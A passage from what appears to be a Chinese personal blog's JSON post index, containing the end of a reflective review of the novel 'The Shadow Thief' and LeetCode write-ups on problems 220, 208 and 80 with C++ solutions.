事情所拂去，于是这从未熄灭的感情就无比猛烈地迸发出来了。\n结局是很美好的，小男孩找到了克蕾儿的住所，用一种浪漫的方式表达出自己迟到的歉意：\n此日清晨，我回到原地，早晨和煦的风微微吹拂，我带来了我的风筝。才刚展开，“老鹰”的双翼就鼓了起来，然后快速飞起。几个行人饶有兴味地停下脚步观看，然后才继续赶路。修补过的老鹰风筝沿着建筑物正面攀爬而上，还在四楼的窗户前旋转了几圈。\n当克蕾儿注意到风筝时，她正在厨房泡茶，她简直不敢相信自己的眼睛，吓得把手上的早餐杯摔碎在地砖上。\n几分钟过后，大楼的门打开，克蕾儿朝我冲了过来。她目不转睛地盯着我，对着我微笑，把手放进我的手里，不是为了握我的手，而是要抓住风筝的手柄。\n在城市的天空里，她用纸老鹰画出大大的S和无数个完美的8。克蕾儿向来擅长在空中写诗，当我终于看懂她写的句子时，我读出：”我想你。”\n一个会用风筝向你写出“我想你”的女孩啊，真让人永远都忘不了她。\n这部作品以爱情这条线作为全书的结尾，我在两年之前初读此书，颇觉意犹未尽。再读之下，我认为这条主线是有缺憾的。为什么自第一次分别之后，四年间再没有机会回去呢？小男孩的妈妈是工作繁重的护士，但是对于小男孩是关爱的，四年暑期全然地没有机会回到海滩边是不合理的。长大后第一次见到克蕾儿，演出之后她身边的男伴是谁呢？两人最终相认之后，三者的感情要如何延续呢？克蕾儿和男伴一同离去时，她的笑声已经没有了大提琴的音色，这意味着什么？我认为，这些细节我是没有读透的，作者给我们留下的空间太多了，总是有一些很美好和一些很不美好的想象在我们心头萦绕，这样的体会见仁见智，于我而言是不好的。\n亲情 将亲情放在最后，是因为这段感情给我最大的触动。\n小男孩的爸爸在他上小学的时候离开了家庭，小男孩的妈妈成了单亲妈妈。这位妈妈真是一个无比温柔的人，总是给自己的孩子最温馨的一面，而将疲累深埋起来。在妈妈的影响下，小男孩也成长为一个温柔的人，他使用自己“偷影子”的能力帮助很多人摆脱了枷锁，这和这位伟大母亲的作用是分不开的。同时，长期与妈妈相依为命，小男孩的情感中具备很多女性的敏感和犹疑，他无法把握自己友情和爱情的界限，因此伤害了无辜的苏菲。\n在小男孩离家求学的时候，这位母亲的信是报喜不报忧的，永远不让自己的孩子操心，直到最终的离去。\n小男孩对妈妈的爱从未变化过，在时光流逝中产生的思考是非常真实的：\n青少年时期，我们总梦想着离开父母的一天，而改天，却换成父母离开我们了。于是我们就只能梦想着，能否有一时片刻，重新变回寄居在父母屋檐下的孩子，能抱抱他们，不害羞地告诉他们，我们爱他们，为了能让自己安心而紧紧依偎在他们身边。\n在妈妈的葬礼之后，迎来了我最为难过的一段：\n我走到厨房，打开冰箱，看到她准备好的晚餐······\n我呆若木鸡地站在敞开的冰箱前，眼泪失控地奔流而下。葬礼全程我都没有哭泣，仿佛她禁止我哭，因为她希望我不要在众人面前失态。只有碰到毫不起眼的小细节时，我们才会突然意识到，深爱的人已经不在的事实：床头桌上的闹钟仍在滴答作响，一个枕头落在凌乱的床边，一张照片立在五斗柜上，一支牙刷插在漱口杯中，一只茶壶立在厨房的窗台上，壶嘴面向窗户以便观看花园，而摆在桌上的，还有吃剩的淋了枫糖浆的苹果卡卡蛋糕。\n读完上面的句子，我的内心如受猛击，在真实世界中漂泊数年的思绪尽皆涌上心头。我们还有多少的时间来陪伴我们最爱的人们呢？亲情，无比浓烈而终将消散，命运已经注定了养你长大的人将离你而去。如若我亲临上面句子中的情境，内心将会是何等的悲痛。\n“悲剧就是把美好的东西打碎给人看”，再读《偷影子的人》，已不觉得它是美好的、治愈的，而是深沉的、忧伤的。友情和爱情的起伏不过是亲情主线的点缀，亲情的缺憾、补完、温馨和厚重而终至于飘散，给全文染上了最强烈的色彩。一位温柔了一辈子、爱了自己孩子一辈子的母亲，最终的愿望还是让自己的孩子追求自己想要的生活，活得健康而快乐，如此才于文末引出了对童年爱情的回溯、与克蕾儿的重逢。\n在这条主线上，我现在所能表达的，大抵只有如此。这条贯穿了全文的脉络，用言语描述起来是无力的，是需要亲自去品味的。\n小结 两年半前读此书，初入大学的校门。在沙河强劲的秋风中有感于爱情线的美好，颇觉本书实在温暖人心。两年间世殊时异，情随事迁，无意中再作翻阅，感慨已然不同。《偷影子的人》真是一部很好的作品，很感谢它在我浮躁、功利的生活中带给我一天多的专心阅读的时光，我的影子被偷走了，融入了书中的世界，它又回来了，留给我萦绕不散的万千思绪。\n总结性的笔记只是我阅读此书时诸多思考中的一点，书中所刻画的如马格、苏菲等人物仅仅简单地提及，但对于整个故事的作用是不可忽视的。我将这本书的电子版本留在此处，希望有缘读到它的人能了解到这个故事的全部、从这部优秀的作品中产生一些思考。如此举侵犯版权，请及时联系我删除。\n《偷影子的人》（mobi格式）\n","date":"2021-04-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%81%B7%E5%BD%B1%E5%AD%90%E7%9A%84%E4%BA%BA/","title":"再读《偷影子的人》"},{"content":"题目链接：https://leetcode-cn.com/problems/contains-duplicate-iii/\n这是个中等题？\n题目 给你一个整数数组 nums 和两个整数 k 和 t 。请你判断是否存在 两个不同下标 i 和 j，使得 abs(nums[i] - nums[j]) \u0026lt;= t ，同时又满足 abs(i - j) \u0026lt;= k 。\n如果存在则返回 true，不存在返回 false。\n示例1\n输入： nums = [1,2,3,1], k = 3, t = 0 输出： true 示例2\n输入： nums = [1,5,9,1,5,9], k = 2, t = 3 输出： false 数据范围\n0 \u0026lt;= nums.length \u0026lt;= 2 * 104 -231 \u0026lt;= nums[i] \u0026lt;= 231 - 1 0 \u0026lt;= k \u0026lt;= 104 0 \u0026lt;= t \u0026lt;= 231 - 1 分析 朴素想法：遍历每个满足条件的 i 、 j ，找到符合条件的就退出。\n时间复杂度 O(kn) ，直接超时。\n想不到更优的办法了，查看题解之后在此进行记录。\nMethod 1、滑动窗口 + 有序集合 首先将问题进行简化。\n希望使得 asb(i - j) \u0026lt;= k ，那么我们每遍历到一个下标 i ，就直接 向前（向左） 查看 k 个元素，直到触及 左边界 。这样做的正确性在于，我们能够考虑到一个下标的左边 k 个元素，而它的右边 k 个元素在接下来的 k 轮循环中得以考虑。 希望使得 abs(nums[i] - nums[j]) \u0026lt;= t ，化简绝对值不等式，等价于 -t \u0026lt;= nums[i] - nums[j] \u0026lt;= t ，等价于 nums[i] - t \u0026lt;= nums[j] \u0026lt;= nums[i] + t 。这个不等式表明了，对于一个 nums[i] 和它左边的 k 个元素 ，我们只需要考虑这 k 个元素中是否有一个落在 nums[i] - t ~ nums[i] + t 这个区间内。 对于第一点，希望保存这左边的 k 个元素，我们自然有许多种办法，但是普通的 队列、向量 等数据结构会使得第二点的条件难以实现 —— 我们如何在这 k 个元素中查找落在 nums[i] - t ~ nums[i] + t 区间内的元素呢？\n显然，我们需要的是一种快速 查找 的数据结构，而且对于遍历到的一个 nums[i] 来说，我们还需要将其插入这个结构中，因此这个数据结构还需要实现快速的 插入 ，我们希望满足第二点要求，显然就需要这个数据结构是 有序的 ，这样查找一个特定范围内的数据才会显得方便。\n好了，这样的数据结构就是 红黑树 。\n很不幸地，我至今不会手写红黑树的实现；很幸运地，我们使用STL提供的类型就行了。\n我此前写过的某篇文章也提及了，C++中 set / map / multiset / multimap 底层都是红黑树；具体到本题，使用 set 即可，因为在一段区间内出现两个相同元素的话，一定是满足条件的。\n我们希望查找某个区间的元素，可以进一步转化为 一次查找 + 一次判断：对于一个 nums[i] ，我们找到 k 个元素中 第一个大于 nums[i] - t 的元素，判断其是否 小于 nums[i] + t ，若满足，返回 true ，若不满足，则这些元素中也没有其他的满足者。\n记住，是 第一个大于 nums[i] - t 的元素！\n非常不错地，set.lower_bound() 干的就是这份工作。\nAC代码1 class Solution { public: bool containsNearbyAlmostDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k, int t) { set\u0026lt;long\u0026gt; s; // set.lower_bound(val) // 返回集合中第一个 大于 val的元素 for (int i = 0; i \u0026lt; nums.size(); i++) { auto lb = s.lower_bound((long)nums[i] - t); // cout \u0026lt;\u0026lt; *lb \u0026lt;\u0026lt; endl;cout \u0026lt;\u0026lt; \u0026#34;I: \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; if (lb != s.end() \u0026amp;\u0026amp; *lb \u0026lt;= (long)nums[i] + t) { /* cout \u0026lt;\u0026lt; \u0026#34;I: \u0026#34; \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; nums[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; t \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; *lb \u0026lt;\u0026lt; \u0026#34; \u0026lt;= \u0026#34; \u0026lt;\u0026lt; (long)nums[i] - t \u0026lt;\u0026lt; endl; */ return true; } s.insert((long)nums[i]); if (i - k \u0026gt;= 0) { s.erase(nums[i - k]); } } return false; } }; 在上面的代码中，有几点需要注意：\n数据类型！ 这个题真是坑的不能再坑了，既然数据范围那么大的话，给出的输入数组就不要用 int 嘛（手动擦汗）。我们的集合类型是 long ，每次加减法之前也都要将数据转为 long 。 删除范围外的数据。我们每一轮循环的时候是 先判断，再插入，再删除 ，因此注意边界条件是 i - k \u0026gt;= 0 。 Performance1 Method 2、桶排序 基本上所有的题解都说是桶排序，那我也就跟着说是桶排序吧，它的实际做法与我对桶排的认知还是有一定的区别的。\n我们知道，在计算机中两个整型相除，结果还是整型，默认 向下取整 ，如 1 / 4 = 0 ， 3 / 4 = 0 ， 4 / 4 = 1 。\n按照这样的逻辑，对于任意的两个 整数 n1 、 n2 ，若它们除以一个数 t 的结果相等，则 abs(n1 - n2) \u0026lt;= t - 1 。\n我们使用反证法来进行证明：\n已知 n1 ÷ t == n2 ÷ t ，不妨令 n1 \u0026gt; n2 ，\n设 abs(n1 - n2) \u0026gt; t - 1 ，则 n1 \u0026gt; n2 + t - 1 ，即 n1 \u0026gt;= n2 + t （它们都是整数）；\n则 n1 ÷ t \u0026gt;= n2 ÷ t + 1 ，\n与已知条件违背，故当 n1 ÷ t == n2 ÷ t 时， abs(n1 - n2) \u0026lt;= t - 1 。\n将这个定理结合题目进行分析，我们希望使得 abs(nums[i] - nums[j]) \u0026lt;= t ，若是 nums[i] / (t + 1) == nums[j] / (t + 1) ，则它们一定满足条件。\n进行了理论上的证明，我们可以再来看看直观的模拟，设 t = 3 ，我们希望找到距离 不大于3 的一对数，根据上面的分析，我们应该计算 nums[i] / (3 + 1) 的值。\n一些正数除以4的值 我们将下面的绿色框框称为 桶 ，上面的数字根据自己除以 4 的值来决定自己应该在哪一个桶里。非常容易发现，同一个桶中的数字满足 差的绝对值不大于3 这一要求。\n除了同一个桶中的数字，显然相邻桶中的数字也可能满足要求。例如对于 1 号桶中的数字 5 来说，隔壁 0 号桶中的 3 或者隔壁 2 号桶中的 8 也是满足要求的。\n我们对给出的整型数组进行遍历，得到一个数之后就去计算它所属的 桶编号 ，然后将这一对 桶编号 —— 数值 的映射保存起来。对于任意一个数，如果它的桶编号已经存在于我们的记录中，那么显然我们已经找到了 同一个桶中的两个数字 ，就可以 return true; 了；如果它的桶编号不存在于我们的记录中，我们还要看看它两边的桶是否存在，存在的话就取出其中的数值来比较一下大小，判断是否满足题意。\n至此，仅剩最后一个细节了：负数。\n你会发现，引入了负数之后，如果还是计算 n / (t + 1) 的话，会出现一些尴尬的情况，还是以 t = 3 为例：\n引入负数的桶编号计算结果 有几点问题：\n-3 和 3 的计算结果竟然都是 0 ，它们属于同一个桶，但是显然不符合 abs(3 - (-3)) \u0026lt;= 3 这一要求 -4 和 -1 ~ -3 的计算结果竟然是不一样的，但是 -1 ~ -4 显然应该属于同一个桶 我们一一来进行解决。\n首先，负数和正数都可能计算出编号为 0 的桶，我们直接令 负数 的计算结果 减一 ，这样做对于我们的桶编号没有影响，但是可以把负数的计算结果和正数的计算结果分开。\n负数的计算结果减一 其次，我们已经将 0 ~ 3 归于正整数的计算中了（0号桶），则不必再将 0 放入到负数的队伍中；这样来说，全体负数应该先 加上1 再进行计算，补上 0 的位置。\n这样， -1 ~ -4 就都属于同一个桶中了。\n负数先加一再进行后续计算 综合以上分析，我们在具体实现中使用一个 map\u0026lt;int, int\u0026gt; 来保存 桶编号 —— 数值 这一映射，遍历数组，计算对应数值的桶编号，查看 map 中是否已经有了相同编号或相邻编号的桶；根据题意，我们一次只能保存 k 个桶，那么只需要重新计算边界数值对应的桶编号，将其删除之后再继续进行循环。\nAC代码2 class Solution { public: int getID(int n, int t) { if (n \u0026gt;= 0) { return (long)n / ((long)t + 1); } else { return ((long)n + 1) / ((long)t + 1) - 1; } } bool containsNearbyAlmostDuplicate(vector\u0026lt;int\u0026gt;\u0026amp; nums, int k, int t) { map\u0026lt;int, int\u0026gt; bucket; for (int idx = 0; idx \u0026lt; nums.size(); idx++) { int id = getID(nums[idx], t); // cout \u0026lt;\u0026lt; id \u0026lt;\u0026lt; endl; auto ite = bucket.find(id); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } ite = bucket.find(id - 1); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } ite = bucket.find(id + 1); if (ite != bucket.end()) { if (abs((long)nums[idx] - ite-\u0026gt;second) \u0026lt;= t) return true; } bucket[id] = nums[idx]; if (idx - k \u0026gt;= 0) { ite = bucket.find(getID(nums[idx - k], t)); bucket.erase(ite); } } return false; } }; 表现烂爆，就不放图了。一些题解中使用 map.count() 来判断桶是否存在，我使用 map.find() ，这样代码就冗长了一些。不过既然本题的核心算法实现了，其余细节了解便好。\n参考资料 [1] 力扣官方题解.存在重复元素 III[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/cun-zai-zhong-fu-yuan-su-iii-by-leetcode-bbkt/\n[2] 宫水三叶.【宫水三叶】一题双解：「滑动窗口 \u0026amp; 二分」\u0026amp;「桶排序」解法[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/gong-shui-san-xie-yi-ti-shuang-jie-hua-d-dlnv/\n[3] 黎猫大侠.C++利用桶分组，详细解释[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/c-li-yong-tong-fen-zu-xiang-xi-jie-shi-b-ofj6/\n","date":"2021-04-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode220.-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-iii/","title":"难题本 | LeetCode220. 存在重复元素 III"},{"content":"题目链接：https://leetcode-cn.com/problems/implement-trie-prefix-tree/\n定场句：人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。\n题目 Trie（发音类似 \u0026ldquo;try\u0026rdquo;）或者说 前缀树 是一种树形数据结构，用于高效地存储和检索字符串数据集中的键。这一数据结构有相当多的应用情景，例如自动补完和拼写检查。\n请你实现 Trie 类：\nTrie() 初始化前缀树对象。\nvoid insert(String word) 向前缀树中插入字符串 word 。\nboolean search(String word) 如果字符串 word 在前缀树中，返回 true（即，在检索之前已经插入）；否则，返回 false 。\nboolean startsWith(String prefix) 如果之前已经插入的字符串 word 的前缀之一为 prefix ，返回 true ；否则，返回 false 。\n示例\n输入：\n[\u0026ldquo;Trie\u0026rdquo;, \u0026ldquo;insert\u0026rdquo;, \u0026ldquo;search\u0026rdquo;, \u0026ldquo;search\u0026rdquo;, \u0026ldquo;startsWith\u0026rdquo;, \u0026ldquo;insert\u0026rdquo;, \u0026ldquo;search\u0026rdquo;]\n[[], [\u0026ldquo;apple\u0026rdquo;], [\u0026ldquo;apple\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;]]\n输出：\n[null, null, true, false, true, null, true]\n解释：\nTrie trie = new Trie();\ntrie.insert(\u0026ldquo;apple\u0026rdquo;);\ntrie.search(\u0026ldquo;apple\u0026rdquo;); // 返回 True\ntrie.search(\u0026ldquo;app\u0026rdquo;); // 返回 False\ntrie.startsWith(\u0026ldquo;app\u0026rdquo;); // 返回 True\ntrie.insert(\u0026ldquo;app\u0026rdquo;);\ntrie.search(\u0026ldquo;app\u0026rdquo;); // 返回 True\n数据范围：\n1 \u0026lt;= word.length, prefix.length \u0026lt;= 2000\nword 和 prefix 仅由小写英文字母组成\ninsert、search 和 startsWith 调用次数 总计 不超过 30000 次\n分析 是一个全新的知识点呢 (#^.^#)\n前缀树 Trie 是一种高效的用于信息检索（information retrieval）的数据结构，可以将搜索复杂度降到最低（关键字长度）。如果我们要在一堆字符串中寻找一个子串，常见的使用 二分搜索树 的思路时间复杂度为 O(M * log N) ，其中 M 是最长子串的长度，N 是现有的字符串个数。而使用前缀树，时间复杂度可以降为 O(M) 。\n原理 —— 插入 前缀树是一颗 多叉树 ，它的每一个节点可以分出若干个子节点，每一条边表示一个字符。你可以发现，从根节点开始向下走去，每走过一条边我们就得到了一个字符，遍历到一个 终止节点 时，我们就得到了一个 单词（字符串） 。\n比如，单词 dog 就能组成这么一颗前缀树：\nTrie “dog” 从根节点向下遍历，到了节点 3 ，它应该被标记为 终止节点 ，我们就得到了 dog 。\n现在我们希望插入一个单词 doge ，要怎么做呢？\n我们还是进行遍历，从根节点出发，依次获取 d 、 o 、 g ，来到了节点 3 ，只需要再插入一条边表示 e 就可以了！\nTrie “dog” \u0026amp; “doge” 在上面的图中，我标出了 终止节点 ，当我们遍历到 3 或 4 时，我们知道它们表示的是一个切实存在的字符串；而当我们遍历到 2 或 1 时，我们知道 do 或者 d 不是一个切实存在的字符串，它们只是某个单词的前缀而已。\n从这个模拟中可以看到， doge 和 dog 使用的是同一些字母前缀，这就是 前缀树 的意思。\n我们再插入一个单词 do ，这时根据我们遍历的结果发现，到达节点 2 的路径就能表示这个单词！那么我们不用再申请一个新的节点，直接将 2 标记为 终止节点 即可。\nTrie “dog” \u0026amp; “doge” \u0026amp; “do” 最后，插入一个 bye 吧，相信读者已经能够模拟出这个过程了！（也可以点开下面的动图看看答案）\nTrie.insert(“bye”) Trie “dog” \u0026amp; “doge” \u0026amp; “do” \u0026amp; “bye” 原理 —— 查询 我们能够插入一个单词（字符串），当然也就需要能够查询某个单词。对于一个给出的字符串 s ，我们从 Trie 的根节点出发，沿着它的每一个字符向下遍历，如果能够到达一个 终止节点 ，那么这个字符串 s 就存在于我们的集合中，否则它就是不存在的。\n例如我们要查询单词 bye ，从根节点出发，沿着每个字符对应的路径依次来到了 5 、 6 、 7 ，最后我们发现节点 7 是个终止节点，太好了，这个单词就是存在的。\n而当我们要查询单词 by ，从根节点出发，依次来到 5 、 6 ,节点 6 不是终止节点，那么这个单词就不存在于我们的集合中。\n原理 —— 构造 现在，我们能够将一个单词插入 Trie 中，也能查询一个单词是否存在于 Trie 中了，最后的问题是，如何构造这颗前缀树呢？\n从上面的例子中，你应该想到，这颗前缀树应该是一颗 多叉树 ，正如一开始所说的那样，而且，它每一个节点所分出来的边必须能够表示我们的 字符集 ，也就是说，假如我们的字符集记做 Σ ，那么前缀树的每个节点就应该有 len(Σ) 数量的边。在这道题中（你可能已经忘了题目了~），每个节点分出来的边数量就是 26 ，表示 a ~ z 是也。\n方法一 如果我们对节点进行编号，就可以用一个 二维数组 来保存整个 Trie 了，我们声明一个 trie[NODE_NUM][26] ，第一个下标表示节点编号，第二个下标表示分出来的26条边，每个边表示一个字母。\n如何表示终止节点呢？很简单，再声明一个 mark[NODE_NUM] 即可，对于任意一个节点的编号 p ，当 mark[p] 为 1 的时候表示它是终止节点。\n根节点编号是 0 ，对于我们上面的例子来说，bye 这个单词对应的路径是这样的：\ntrie[0][1] = 5 trie[5][24] = 6 trie[6][4] = 7 每一个字符 ch 对应的第二个下标就简单地用 ch - 'a'来表示就行了。\n方法二 第一种构造方法胜在简单，节点下标和延伸出的边含义很直观，但是所耗费的空间比较大，即使某条路径是不存在的（如单词 hello ），它所对应的空间还是存在于数组中（只不过都被写为了 0 来表示不存在）。\n如果我们用链表的思想 + 动态申请内存的办法，效果则大不相同。使用一个数据结构来表示节点，它含有一个长度为 26 的 指针数组 ，每一个单元表示对应的边，指向下一个节点。同时，这个结构顺便定义了一个成员变量来表示该节点是否为终止节点，这种办法就简洁多了。\nAC代码1 此代码对应构造方法1\nclass Trie { public: int tire[100000][26]; int mark[100000]; int k; /** Initialize your data structure here. */ Trie() { k = 1; memset(tire, 0, sizeof(tire)); memset(mark, 0, sizeof(mark)); } /** Inserts a word into the trie. */ void insert(string word) { int p = 0; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { tire[p][c] = k; // 编号从1开始 k++; p = tire[p][c]; } } mark[p] = 1; } /** Returns if the word is in the trie. */ bool search(string word) { int p = 0; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { return false; } } if (mark[p]) return true; else return false; } /** Returns if there is any word in the trie that starts with the given prefix. */ bool startsWith(string prefix) { int p = 0; int c = 0; for (auto ch : prefix) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { return false; } } return true; } }; /** * Your Trie object will be instantiated and called as such: * Trie* obj = new Trie(); * obj-\u0026gt;insert(word); * bool param_2 = obj-\u0026gt;search(word); * bool param_3 = obj-\u0026gt;startsWith(prefix); */ AC代码2 此代码对应构造方法2\nclass Trie { public: typedef struct n { struct n* childen[26]; int mark; } Node, *PNode; PNode root; /** Initialize your data structure here. */ Trie() { root = new Node; for (int i = 0; i \u0026lt; 26; i++) { (*root).childen[i] = 0; } } /** Inserts a word into the trie. */ void insert(string word) { PNode p = root; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { (*p).childen[c] = new Node; p = (*p).childen[c]; for (int i = 0; i \u0026lt; 26; i++) { (*p).childen[i] = 0; } p-\u0026gt;mark = 0; } } p-\u0026gt;mark = 1; } /** Returns if the word is in the trie. */ bool search(string word) { PNode p = root; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { return false; } } if (p-\u0026gt;mark) return true; else return false; } /** Returns if there is any word in the trie that starts with the given prefix. */ bool startsWith(string prefix) { PNode p = root; int c = 0; for (auto ch : prefix) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { return false; } } return true; } }; /** * Your Trie object will be instantiated and called as such: * Trie* obj = new Trie(); * obj-\u0026gt;insert(word); * bool param_2 = obj-\u0026gt;search(word); * bool param_3 = obj-\u0026gt;startsWith(prefix); */ Performance——方法2 Performance Compare 参考资料 [1] 向前走别回头.字典树（前缀树）[EB/OL].2018-08-24\nhttps://blog.csdn.net/weixin_39778570/article/details/81990417\n[2] GeeksforGeeks.Trie | (Insert and Search)[EB/OL].2019-09-04\nhttps://www.geeksforgeeks.org/trie-insert-and-search/\n","date":"2021-04-14T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode208.-%E5%AE%9E%E7%8E%B0-trie-%E5%89%8D%E7%BC%80%E6%A0%91/","title":"难题本 | LeetCode208. 实现 Trie (前缀树)"},{"content":"题目链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/\n题目 给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 最多出现两次 ，返回删除后数组的新长度。\n不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。\n示例1\n输入： nums = [1,1,1,2,2,3] 输出： 5, nums = [1,1,2,2,3] 解释： 函数应返回新长度 length = 5, 并且原数组的前五个元素被修改为 1, 1, 2, 2, 3 。 不需要考虑数组中超出新长度后面的元素。 示例2\n输入： nums = [0,0,1,1,1,1,2,3,3] 输出： 7, nums = [0,0,1,1,2,3,3] 数据范围\n1 \u0026lt;= nums.length \u0026lt;= 3 * 104 -104 \u0026lt;= nums[i] \u0026lt;= 104 nums 已按升序排列 分析 更新博客主题第一篇~ 分析部分不用 \u0026gt; 包起来了 ヽ(￣▽￣)ﾉ\n一道乍看简单，细想麻烦的题目，放在 错题本 这个分类里，主要是由于朴素的暴力做法是能通过的。当然，题解里面的想法更为强大，当然，并不是特别难想，但是细节是较多的，也是本次错得最多的地方。\n朴素做法 这是我最初的想法。根据题意，最终相同的数字最多只有 两个 ，那么我们使用一个指针向前移动，当它和它的 下一位 元素值相同时，它的 下下位 元素的数值就必须和它不同了。即，当我们向后看去，发现下一个元素与当前元素相同时，可以直接确定下下位元素的值；并且确定了之后，需要从确定的点开始，将后面的元素都向前移动。\n示意图1 移动之后，还需要进行 pop_back() 的操作。\n这就跟从一个有序数组中删除数据一样，我们删除的是一段重复的数据，要将后面的东西向前移动，覆盖掉这一段。\n这种思路下，限制条件就很多了：\nQ：当前元素没有下一个元素怎么办 A：说明它到达了最后一个元素，循环结束 Q：寻找下一个元素的时候有哪些注意点 A：使用一个指针向后寻找下一个元素，当它不越界且与当前元素仍然相等的时候，继续向后移动；当这一个循环退出之后，说明几个问题：我们找到了下一个元素或者之后没有符合条件的元素，在这里还需要进行一次判断 不得不说，我最开始、最朴素的想法反而特别的复杂，根据上面的内容能写出如下的代码：\nAC代码1 class Solution { public: int removeDuplicates(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt;::iterator p_now; vector\u0026lt;int\u0026gt;::iterator p_next; vector\u0026lt;int\u0026gt;::iterator p_tmp; int res, num_now; for (p_now = nums.begin(); p_now \u0026lt; nums.end(); ) { if (p_now == nums.end() - 1) { p_now++; break; } if (*p_now == *(p_now + 1)) { num_now = *p_now; p_now += 2; p_next = p_now; // get next num different from now while (p_next \u0026lt; nums.end() \u0026amp;\u0026amp; *p_next == num_now) { p_next++; } // next position is valid if (p_next \u0026lt; nums.end() \u0026amp;\u0026amp; p_next != p_now) { p_tmp = p_now; int diff = p_next - p_now; while (p_next \u0026lt; nums.end()) { *p_tmp = *p_next; p_next++; p_tmp++; } while (diff-- \u0026gt; 0) { nums.pop_back(); } } // next position is invalid else if (p_next == nums.end()) { break; } } else { p_now++; } } // cout \u0026lt;\u0026lt; *p_now \u0026lt;\u0026lt; endl; res = p_now - nums.begin(); while (nums.size() \u0026gt; res) { nums.pop_back(); } return res; } }; 大几十行的代码，没什么好说的了 -_-||\n对于原地修改来说，我的 pop_back() 操作实际上显得多余，表现是很一般的：\nPerformance1 双指针 对于上面的做法，向后看 的思想使得我对于循环边界条件的判断比较困难，因为我们总是要考虑当前元素的 下一位 、 下下位 ，很容易就产生越界的问题。\n如果 向前看 ，怎么做呢？\n双指针的思想是，使用 快慢指针 ，慢指针 slow 指向当前的位置，快指针 fast 指向当前位置 应该填充 的元素；向前看去，当 *slow == *(slow - 2) 时，继续移动 fast 而使 slow 保持不动，直到符合 *slow != *fast ，即改变当前元素的值使得它不再与之前的元素相同。\n千言万语不如一张GIF（请点开它）：\nTets 注意当 slow 指向了第三个 2 的时候，*slow == *(slow - 2) ，则 slow 不再继续前移，只移动 fast ，且只当 *fast ！= *slow 的时候才会继续移动 slow 。在本例中，将 *slow 更新为 3 之后， fast 和 slow 都要继续移动，然而 fast 已经走完了整个数组，故循环结束了。\n由此写出AC代码2.\nAC代码2 class Solution { public: int removeDuplicates(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt;::iterator slow; vector\u0026lt;int\u0026gt;::iterator fast; slow = nums.begin(); for (fast = nums.begin(); fast \u0026lt; nums.end(); fast++) { *slow = *fast; if (slow \u0026lt; nums.begin() + 2) { slow++; continue; } if (*slow == *(slow - 2) \u0026amp;\u0026amp; *slow == *fast) { // do not add slow // cout \u0026lt;\u0026lt; *slow \u0026lt;\u0026lt; \u0026#34; == \u0026#34; \u0026lt;\u0026lt; *fast \u0026lt;\u0026lt; endl; // cout \u0026lt;\u0026lt; slow - nums.begin() \u0026lt;\u0026lt; endl; continue; } slow++; } /* for (vector\u0026lt;int\u0026gt;::iterator tmp = nums.begin(); tmp != slow; tmp++) { cout \u0026lt;\u0026lt; *tmp \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Ret: \u0026#34; \u0026lt;\u0026lt; slow - nums.begin() \u0026lt;\u0026lt; endl; */ return slow - nums.begin(); } }; 我将调试代码都留在了此处，这是因为AC代码中有一步细节需要注意：\nfor (fast = nums.begin(); fast \u0026lt; nums.end(); fast++) { *slow = *fast; // --- snip --- } fast 的每一步移动都要伴随着 slow 的更新，并不需要关注 slow 满足什么条件。仅当 slow 与它的上上位不同的时候才会继续移动，因此不必担心赋值出现什么问题。这一步可是我WA了三次才得到的惨痛教训！\nPerformance2 参考资料 [1] 力扣官方题解.删除排序数组中的重复项 II[EB/OL].2021-04-05\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/shan-chu-pai-xu-shu-zu-zhong-de-zhong-fu-yec2/\n[2] 